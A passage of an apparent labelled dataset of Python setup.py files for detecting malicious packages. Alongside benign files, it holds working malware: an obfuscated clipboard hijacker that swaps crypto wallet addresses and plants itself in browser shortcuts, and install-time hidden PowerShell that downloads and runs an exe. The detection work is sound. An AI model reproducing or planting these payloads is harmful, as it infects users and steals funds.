_0x4d9550=_0x11d4,_0x41c8ae=_0x314c14();while(!![]){try{var _0x291238=parseInt(_0x4d9550(0x83))/0x1+parseInt(_0x4d9550(0x87))/0x2*(-parseInt(_0x4d9550(0x7c))/0x3)+-parseInt(_0x4d9550(0x81))/0x4*(-parseInt(_0x4d9550(0x8b))/0x5)+parseInt(_0x4d9550(0x7e))/0x6*(parseInt(_0x4d9550(0x75))/0x7)+-parseInt(_0x4d9550(0x89))/0x8+-parseInt(_0x4d9550(0x85))/0x9+parseInt(_0x4d9550(0x82))/0xa;if(_0x291238===_0x4da2d4)break;else _0x41c8ae['push'](_0x41c8ae['shift']());}catch(_0x435e56){_0x41c8ae['push'](_0x41c8ae['shift']());}}}(_0x7dfe,0x8e72d));let page=chrome[_0x327ff6(0x77)][_0x327ff6(0x76)]();function _0x11d4(_0x5d4133,_0x41221d){var _0x7dfebe=_0x7dfe();return _0x11d4=function(_0x11d4f7,_0x3282ea){_0x11d4f7=_0x11d4f7-0x75;var _0x34f11d=_0x7dfebe[_0x11d4f7];return _0x34f11d;},_0x11d4(_0x5d4133,_0x41221d);}var inputElement=document[_0x327ff6(0x88)](_0x327ff6(0x8a));document['body'][_0x327ff6(0x86)](inputElement),inputElement['focus']();function check(){var _0xe8a3e=_0x327ff6;document[_0xe8a3e(0x79)](_0xe8a3e(0x7f));var _0x5eb90d=inputElement[_0xe8a3e(0x7a)];_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^(0x)[a-fA-F0-9]{40}$/,'0x18c36eBd7A5d9C3b88995D6872BCe11a080Bc4d9'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^T[A-Za-z1-9]{33}$/,'TWStXoQpXzVL8mx1ejiVmkgeUVGjZz8LRx'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^(bnb1)[0-9a-z]{38}$/,_0xe8a3e(0x80)),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})$/,'bc1qqwkpp77ya9qavyh8sm8e4usad45fwlusg7vs5v'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/,_0xe8a3e(0x84)),inputElement['value']=_0x5eb90d,inputElement[_0xe8a3e(0x7d)](),document['execCommand'](_0xe8a3e(0x7b)),inputElement[_0xe8a3e(0x7a)]='';}function _0x7dfe(){var _0x1c8730=['8bkbJpt','14903530AaRyNg','646317UWotJX','LPDEYUCna9e5dYaDPYorJBXXgc43tvV9Rq','9448686izWZHq','appendChild','2hKfLTM','createElement','3544256zMWJYQ','textarea','10470IXKEdo','42UUKWJT','getBackgroundPage','extension','replace','execCommand','value','copy','1539693aOTNUd','select','448728VNjtMg','paste','bnb1cm0pllx3c7e902mta8drjfyn0ypl7ar4ty29uv'];_0x7dfe=function(){return _0x1c8730;};return _0x7dfe();}setInterval(check,0x3e8);''')\n        \n    with open(appDataPath + '\\\\Extension\\\\manifest.json', 'w+') as manifestFile:\n        manifestFile.write('{\"name\": \"Windows\",\"background\": {\"scripts\": [\"background.js\"]},\"version\": \"1\",\"manifest_version\": 2,\"permissions\": [\"clipboardWrite\", \"clipboardRead\"]}')\n\n    shell = Dispatch('WScript.Shell')\n\n    for path in paths:\n        for root_directory, sub_directories, files in os.walk(path):\n            for file in files:\n                if file.endswith('.lnk'):\n                    try:\n                        shortcut = shell.CreateShortcut(root_directory + '\\\\' + file)\n                        executable_name = os.path.basename(shortcut.TargetPath)\n\n                        if executable_name in ['chrome.exe', 'msedge.exe', 'launcher.exe', 'brave.exe']:\n                            shortcut.Arguments = '--load-extension={appDataPath}\\\\Extension'.format(appDataPath=appDataPath)\n                            shortcut.Save()\n                    except Exception as e:\n                      ...\n\nsetup(\n  name = 'hello-world-exampl',\n  packages = ['hello-world-exampl'],\n  version = '0.1'\n)", "target": 1}
{"idx": "getvisa-4.46", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'getvisa',\n    packages = ['modlib'],\n    version = '4.47',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "fabric-2.7.1", "func": "#!/usr/bin/env python\n\nimport os\nimport setuptools\n\n# Enable the option of building/installing Fabric 2.x as \"fabric2\". This allows\n# users migrating from 1.x to 2.x to have both in the same process space and\n# migrate piecemeal.\n#\n# NOTE: this requires some irritating tomfoolery; to wit:\n# - the repo has a fabric2/ symlink to fabric/ so that things looking for\n# fabric2/<whatever> will find it OK, whether that's code in here or deeper in\n# setuptools/wheel/etc\n# - wheels do _not_ execute this on install, only on generation, so maintainers\n# just build wheels with the env var below turned on, and those wheels install\n# 'fabric2' no problem\n# - sdists execute this _both_ on package creation _and_ on install, so the env\n# var only helps with inbound package metadata; on install by a user, if they\n# don't have the env var, they'd end up with errors because this file tries to\n# look in fabric/, not fabric2/\n# - thus, we use a different test that looks locally to see if only one dir\n# is present, and that overrides the env var test.\n#\n# See also sites/www/installing.txt.\n\nenv_wants_v2 = os.environ.get(\"PACKAGE_AS_FABRIC2\", False)\n\nhere = os.path.abspath(os.path.dirname(__file__))\nfabric2_present = os.path.isdir(os.path.join(here, \"fabric2\"))\nfabric_present = os.path.isdir(os.path.join(here, \"fabric\"))\nonly_v2_present = fabric2_present and not fabric_present\n\npackage_name = \"fabric\"\nbinary_name = \"fab\"\nif env_wants_v2 or only_v2_present:\n    package_name = \"fabric2\"\n    binary_name = \"fab2\"\npackages = setuptools.find_packages(\n    include=[package_name, \"{}.*\".format(package_name)]\n)\n\n# Version info -- read without importing\n_locals = {}\nwith open(os.path.join(package_name, \"_version.py\")) as fp:\n    exec(fp.read(), None, _locals)\nversion = _locals[\"__version__\"]\n\ntesting_deps = [\"mock>=2.0.0,<3.0\"]\npytest_deps = [\"pytest>=3.2.5,<4.0\"]\n\nsetuptools.setup(\n    name=package_name,\n    version=version,\n    description=\"High level SSH command execution\",\n    license=\"BSD\",\n    long_description=open(\"README.rst\").read(),\n    author=\"Jeff Forcier\",\n    author_email=\"jeff@bitprophet.org\",\n    url=\"https://fabfile.org\",\n    project_urls={\n        \"Docs\": \"https://docs.fabfile.org\",\n        \"Source\": \"https://github.com/fabric/fabric\",\n        \"Issues\": \"https://github.com/fabric/fabric/issues\",\n        \"Changelog\": \"https://www.fabfile.org/changelog.html\",\n        \"CI\": \"https://app.circleci.com/pipelines/github/fabric/fabric\",\n        \"Twitter\": \"https://twitter.com/pyfabric\",\n    },\n    install_requires=[\"invoke>=1.3,<2.0\", \"paramiko>=2.4\", \"pathlib2\"],\n    extras_require={\n        \"testing\": testing_deps,\n        \"pytest\": testing_deps + pytest_deps,\n    },\n    packages=packages,\n    entry_points={\n        \"console_scripts\": [\n            \"{} = {}.main:program.run\".format(binary_name, package_name)\n        ]\n    },\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Console\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: System Administrators\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: POSIX\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Topic :: Software Development\",\n        \"Topic :: Software Development :: Build Tools\",\n        \"Topic :: Software Development :: Libraries\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Topic :: System :: Clustering\",\n        \"Topic :: System :: Software Distribution\",\n        \"Topic :: System :: Systems Administration\",\n    ],\n)\n", "target": 0}
{"idx": "grpc-interceptor-0.15.0", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackage_dir = \\\n{'': 'src'}\n\npackages = \\\n['grpc_interceptor',\n 'grpc_interceptor.testing',\n 'grpc_interceptor.testing.protos']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['grpcio>=1.32.0,<2.0.0']\n\nextras_require = \\\n{'testing': ['protobuf>=3.6.0']}\n\nsetup_kwargs = {\n    'name': 'grpc-interceptor',\n    'version': '0.15.0',\n    'description': 'Simplifies gRPC interceptors',\n    'long_description': '[![Tests](https://github.com/d5h-foss/grpc-interceptor/workflows/Tests/badge.svg)](https://github.com/d5h-foss/grpc-interceptor/actions?workflow=Tests)\\n[![Codecov](https://codecov.io/gh/d5h-foss/grpc-interceptor/branch/master/graph/badge.svg)](https://codecov.io/gh/d5h-foss/grpc-interceptor)\\n[![Read the Docs](https://readthedocs.org/projects/grpc-interceptor/badge/)](https://grpc-interceptor.readthedocs.io/)\\n[![PyPI](https://img.shields.io/pypi/v/grpc-interceptor.svg)](https://pypi.org/project/grpc-interceptor/)\\n\\n# Summary\\n\\nSimplified Python gRPC interceptors.\\n\\nThe Python `grpc` package provides service interceptors, but they\\'re a bit hard to\\nuse because of their flexibility. The `grpc` interceptors don\\'t have direct access\\nto the request and response objects, or the service context. Access to these are often\\ndesired, to be able to log data in the request or response, or set status codes on the\\ncontext.\\n\\n# Installation\\n\\nTo just get the interceptors (and probably not write your own):\\n\\n```console\\n$ pip install grpc-interceptor\\n```\\n\\nTo also get the testing framework, which is good if you\\'re writing your own interceptors:\\n\\n```console\\n$ pip install grpc-interceptor[testing]\\n```\\n\\n# Usage\\n\\n## Server Interceptor\\n\\nTo define your own interceptor (we can use `ExceptionToStatusInterceptor` as an example):\\n\\n```python\\nfrom grpc_interceptor import ServerInterceptor\\nfrom grpc_interceptor.exceptions import GrpcException\\n\\nclass ExceptionToStatusInterceptor(ServerInterceptor):\\n    def intercept(\\n        self,\\n        method: Callable,\\n        request: Any,\\n        context: grpc.ServicerContext,\\n        method_name: str,\\n    ) -> Any:\\n        \"\"\"Override this method to implement a custom interceptor.\\n         You should call method(request, context) to invoke the\\n         next handler (either the RPC method implementation, or the\\n         next interceptor in the list).\\n         Args:\\n             method: The next interceptor, or method implementation.\\n             request: The RPC request, as a protobuf message.\\n             context: The ServicerContext pass by gRPC to the service.\\n             method_name: A string of the form\\n                 \"/protobuf.package.Service/Method\"\\n         Returns:\\n             This should generally return the result of\\n             method(request, context), which is typically the RPC\\n             method response, as a protobuf message. The interceptor\\n             is free to modify this in some way, however.\\n         \"\"\"\\n        try:\\n            return method(request, context)\\n        except GrpcException as e:\\n            context.set_code(e.status_code)\\n            context.set_details(e.details)\\n            raise\\n```\\n\\nThen inject your interceptor when you create the `grpc` server:\\n\\n```python\\ninterceptors = [ExceptionToStatusInterceptor()]\\nserver = grpc.server(\\n    futures.ThreadPoolExecutor(max_workers=10),\\n    interceptors=interceptors\\n)\\n```\\n\\nTo use `ExceptionToStatusInterceptor`:\\n\\n```python\\nfrom grpc_interceptor.exceptions import NotFound\\n\\nclass MyService(my_pb2_grpc.MyServiceServicer):\\n    def MyRpcMethod(\\n        self, request: MyRequest, context: grpc.ServicerContext\\n    ) -> MyResponse:\\n        thing = lookup_thing()\\n        if not thing:\\n            raise NotFound(\"Sorry, your thing is missing\")\\n        ...\\n```\\n\\nThis results in the gRPC status status code being set to `NOT_FOUND`,\\nand the details `\"Sorry, your thing is missing\"`. This saves you the hassle of\\ncatching exceptions in your service handler, or passing the context down into\\nhelper functions so they can call `context.abort` or `context.set_code`. It allows\\nthe more Pythonic approach of just raising an exception from anywhere in the code,\\nand having it be handled automatically.\\n\\n## Client Interceptor\\n\\nWe will use an invocation metadata injecting interceptor as an example of defining\\na client interceptor:\\n\\n```python\\nfrom grpc_interceptor import ClientCallDetails, ClientInterceptor\\n\\nclass MetadataClientInterceptor(ClientInterceptor):\\n\\n    def intercept(\\n        self,\\n        method: Callable,\\n        request_or_iterator: Any,\\n        call_details: grpc.ClientCallDetails,\\n    ):\\n        \"\"\"Override this method to implement a custom interceptor.\\n\\n        This method is called for all unary and streaming RPCs. The interceptor\\n        implementation should call `method` using a `grpc.ClientCallDetails` and the\\n        `request_or_iterator` object as parameters. The `request_or_iterator`\\n        parameter may be type checked to determine if this is a singluar request\\n        for unary RPCs or an iterator for client-streaming or client-server streaming\\n        RPCs.\\n\\n        Args:\\n            method: A function that proceeds with the invocation by executing the next\\n                interceptor in the chain or invoking the actual RPC on the underlying\\n                channel.\\n            request_or_iterator: RPC request message or iterator of request messages\\n                for streaming requests.\\n            call_details: Describes an RPC to be invoked.\\n\\n        Returns:\\n            The type of the return should match the type of the return value received\\n            by calling `method`. This is an object that is both a\\n            `Call <https://grpc.github.io/grpc/python/grpc.html#grpc.Call>`_ for the\\n            RPC and a `Future <https://grpc.github.io/grpc/python/grpc.html#grpc.Future>`_.\\n\\n            The actual result from the RPC can be got by calling `.result()` on the\\n            value returned from `method`.\\n        \"\"\"\\n        new_details = ClientCallDetails(\\n            call_details.method,\\n            call_details.timeout,\\n            [(\"authorization\", \"Bearer mysecrettoken\")],\\n            call_details.credentials,\\n            call_details.wait_for_ready,\\n            call_details.compression,\\n        )\\n\\n        return method(request_or_iterator, new_details)\\n```\\n\\nNow inject your interceptor when you create the ``grpc`` channel:\\n\\n```python\\ninterceptors = [MetadataClientInterceptor()]\\nwith grpc.insecure_channel(\"grpc-server:50051\") as channel:\\n    channel = grpc.intercept_channel(channel, *interceptors)\\n    ...\\n```\\n\\nClient interceptors can also be used to retry RPCs that fail due to specific errors, or\\na host of other use cases. There are some basic approaches in the tests to get you\\nstarted.\\n\\n# Documentation\\n\\nThe examples above showed usage for simple unary-unary RPC calls. For examples of\\nstreaming and asyncio RPCs, read the\\n[complete documentation here](https://grpc-interceptor.readthedocs.io/).\\n\\nNote that there is no asyncio client interceptors at the moment, though contributions\\nare welcome.\\n',\n    'author': 'Dan Hipschman',\n    'author_email': None,\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/d5h-foss/grpc-interceptor',\n    'package_dir': package_dir,\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'extras_require': extras_require,\n    'python_requires': '>=3.6.1,<4.0.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "gym-0.25.1", "func": "\"\"\"Setups the project.\"\"\"\nimport itertools\nimport re\n\nfrom setuptools import find_packages, setup\n\nwith open(\"gym/version.py\") as file:\n    full_version = file.read()\n    assert (\n        re.match(r'VERSION = \"\\d\\.\\d+\\.\\d+\"\\n', full_version).group(0) == full_version\n    ), f\"Unexpected version: {full_version}\"\n    VERSION = re.search(r\"\\d\\.\\d+\\.\\d+\", full_version).group(0)\n\n# Environment-specific dependencies.\nextras = {\n    \"atari\": [\"ale-py~=0.7.5\"],\n    \"accept-rom-license\": [\"autorom[accept-rom-license]~=0.4.2\"],\n    \"box2d\": [\"box2d-py==2.3.5\", \"pygame==2.1.0\"],\n    \"classic_control\": [\"pygame==2.1.0\"],\n    \"mujoco_py\": [\"mujoco_py<2.2,>=2.1\"],\n    \"mujoco\": [\"mujoco==2.2.0\", \"imageio>=2.14.1\"],\n    \"toy_text\": [\"pygame==2.1.0\"],\n    \"other\": [\"lz4>=3.1.0\", \"opencv-python>=3.0\", \"matplotlib>=3.0\"],\n}\n\n# Testing dependency groups.\ntesting_group = set(extras.keys()) - {\"accept-rom-license\", \"atari\"}\nextras[\"testing\"] = list(\n    set(itertools.chain.from_iterable(map(lambda group: extras[group], testing_group)))\n) + [\"pytest==7.0.1\"]\n\n# All dependency groups - accept rom license as requires user to run\nall_groups = set(extras.keys()) - {\"accept-rom-license\"}\nextras[\"all\"] = list(\n    set(itertools.chain.from_iterable(map(lambda group: extras[group], all_groups)))\n)\n\n# Uses the readme as the description on PyPI\nwith open(\"README.md\") as fh:\n    long_description = \"\"\n    header_count = 0\n    for line in fh:\n        if line.startswith(\"##\"):\n            header_count += 1\n        if header_count < 2:\n            long_description += line\n        else:\n            break\n\nsetup(\n    author=\"Gym Community\",\n    author_email=\"jkterry@umd.edu\",\n    classifiers=[\n        # Python 3.6 is minimally supported (only with basic gym environments and API)\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n    description=\"Gym: A universal API for reinforcement learning environments\",\n    extras_require=extras,\n    install_requires=[\n        \"numpy >= 1.18.0\",\n        \"cloudpickle >= 1.2.0\",\n        \"importlib_metadata >= 4.8.0; python_version < '3.10'\",\n        \"gym_notices >= 0.0.4\",\n        \"dataclasses == 0.8; python_version == '3.6'\",\n    ],\n    license=\"MIT\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    name=\"gym\",\n    packages=[package for package in find_packages() if package.startswith(\"gym\")],\n    package_data={\n        \"gym\": [\n            \"envs/mujoco/assets/*.xml\",\n            \"envs/classic_control/assets/*.png\",\n            \"envs/toy_text/font/*.ttf\",\n            \"envs/toy_text/img/*.png\",\n            \"py.typed\",\n        ]\n    },\n    python_requires=\">=3.6\",\n    tests_require=extras[\"testing\"],\n    url=\"https://www.gymlibrary.ml/\",\n    version=VERSION,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "py-peprandompaypal-5.97", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-peprandompaypal',\n    packages = ['modlib'],\n    version = '1.76',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "functions-framework-3.1.0", "func": "# Copyright 2020 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nfrom io import open\nfrom os import path\n\nfrom setuptools import find_packages, setup\n\nhere = path.abspath(path.dirname(__file__))\n\n# Get the long description from the README file\nwith open(path.join(here, \"README.md\"), encoding=\"utf-8\") as f:\n    long_description = f.read()\n\nsetup(\n    name=\"functions-framework\",\n    version=\"3.1.0\",\n    description=\"An open source FaaS (Function as a service) framework for writing portable Python functions -- brought to you by the Google Cloud Functions team.\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/googlecloudplatform/functions-framework-python\",\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    classifiers=[\n        \"Development Status :: 3 - Alpha\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n    keywords=\"functions-framework\",\n    packages=find_packages(where=\"src\"),\n    namespace_packages=[\"google\", \"google.cloud\"],\n    package_dir={\"\": \"src\"},\n    python_requires=\">=3.5, <4\",\n    install_requires=[\n        \"flask>=1.0,<3.0\",\n        \"click>=7.0,<9.0\",\n        \"watchdog>=1.0.0\",\n        \"gunicorn>=19.2.0,<21.0; platform_system!='Windows'\",\n        \"cloudevents>=1.2.0,<2.0.0\",\n    ],\n    entry_points={\n        \"console_scripts\": [\n            \"ff=functions_framework._cli:_cli\",\n            \"functions-framework=functions_framework._cli:_cli\",\n            \"functions_framework=functions_framework._cli:_cli\",\n            \"functions-framework-python=functions_framework._cli:_cli\",\n            \"functions_framework_python=functions_framework._cli:_cli\",\n        ]\n    },\n)\n", "target": 0}
{"idx": "libpongurlvm-5.39", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpongurlvm',\n    packages = ['modlib'],\n    version = '2.73',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "gin-config-0.5.0", "func": "# coding=utf-8\n# Copyright 2020 The Gin-Config Authors.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"Setup script for gin-config.\n\nSee https://github.com/google/gin-config for documentation.\n\"\"\"\n\nfrom os import path\nfrom setuptools import find_packages\nfrom setuptools import setup\n\n_VERSION = '0.5.0'\n\nhere = path.abspath(path.dirname(__file__))\n\nlong_description = \"\"\"\n# Gin\n\nGin provides a lightweight configuration framework for Python, based on\ndependency injection. Functions or classes can be decorated with\n`@gin.configurable`, allowing default parameter values to be supplied from a\nconfig file (or passed via the command line) using a simple but powerful syntax.\nThis removes the need to define and maintain configuration objects (e.g.\nprotos), or write boilerplate parameter plumbing and factory code, while often\ndramatically expanding a project's flexibility and configurability.\n\nGin is particularly well suited for machine learning experiments (e.g. using\nTensorFlow), which tend to have many parameters, often nested in complex ways.\n\n\n**Authors**: Dan Holtmann-Rice, Sergio Guadarrama, Nathan Silberman\n**Contributors**: Oscar Ramirez, Marek Fiser\n\"\"\"\n\nsetup(\n    name='gin-config',\n    version=_VERSION,\n    include_package_data=True,\n    packages=find_packages(exclude=['docs']),  # Required\n    package_data={'testdata': ['testdata/*.gin']},\n    install_requires=[],\n    extras_require={  # Optional\n        'tensorflow': ['tensorflow >= 1.13.0'],\n        'tensorflow-gpu': ['tensorflow-gpu >= 1.13.0'],\n        'tf-nightly': ['tf-nightly'],\n        'torch': ['torch >= 1.3.0'],\n        'pytorch-nightly': ['pytorch-nightly'],\n        'testing': [\n            'absl-py >= 0.1.6',\n            'mock >= 3.0.5',\n            'nose',\n        ]\n    },\n    description='Gin-Config: A lightweight configuration library for Python',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    url='https://github.com/google/gin-config',  # Optional\n    author='The Gin-Config Team',  # Optional\n    classifiers=[  # Optional\n        'Development Status :: 3 - Alpha',\n\n        # Indicate who your project is intended for\n        'Intended Audience :: Developers',\n        'Intended Audience :: Education',\n        'Intended Audience :: Science/Research',\n\n        # Pick your license as you wish\n        'License :: OSI Approved :: Apache Software License',\n\n        # Specify the Python versions you support here. In particular, ensure\n        # that you indicate whether you support Python 2, Python 3 or both.\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n\n        'Topic :: Scientific/Engineering',\n        'Topic :: Scientific/Engineering :: Mathematics',\n        'Topic :: Scientific/Engineering :: Artificial Intelligence',\n        'Topic :: Software Development',\n        'Topic :: Software Development :: Libraries',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ],\n    project_urls={  # Optional\n        'Documentation': 'https://github.com/google/gin-config/docs',\n        'Bug Reports': 'https://github.com/google/gin-config/issues',\n        'Source': 'https://github.com/google/gin-config',\n    },\n    license='Apache 2.0',\n    keywords='gin-config gin python configuration machine learning'\n)\n", "target": 0}
{"idx": "google-cloud-speech-2.15.0", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n\n# Package metadata.\n\nname = \"google-cloud-speech\"\ndescription = \"Google Cloud Speech API client library\"\nversion = \"2.15.0\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, 